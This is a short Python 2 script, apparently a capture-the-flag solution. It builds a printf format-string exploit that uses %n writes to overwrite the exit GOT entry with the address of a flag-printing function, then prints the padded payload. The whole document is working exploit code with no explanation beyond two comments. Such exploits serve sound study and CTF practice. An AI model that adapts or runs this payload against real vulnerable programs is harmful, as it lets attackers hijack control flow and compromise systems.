import struct

PRINT_FLAG = 0x80485ab

EXIT_PLT = 0x804a01c

def pad(s):
    return s+"X"*(520-len(s))

exploit = ""
exploit += struct.pack("I",EXIT_PLT)
exploit += struct.pack("I",EXIT_PLT+2)
exploit += "BBBBCCCC"
exploit += "%4$34203x" #Only the fourth parameter of printf
exploit += "%4$n"
exploit += "%33369x" #Only the fourth parameter of printf
exploit += "%5$n"

print pad(exploit)
